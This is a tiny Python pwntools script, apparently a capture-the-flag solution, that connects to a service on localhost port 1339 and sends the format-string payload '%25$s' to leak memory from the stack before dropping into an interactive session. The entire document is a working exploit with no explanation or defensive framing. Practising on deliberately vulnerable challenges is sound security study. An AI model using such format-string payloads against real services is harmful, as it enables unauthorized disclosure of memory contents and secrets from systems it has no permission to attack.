from pwn import *

p = remote('localhost', 1339)
#p = process('./main')

p.sendline('%25$s')

p.interactive()
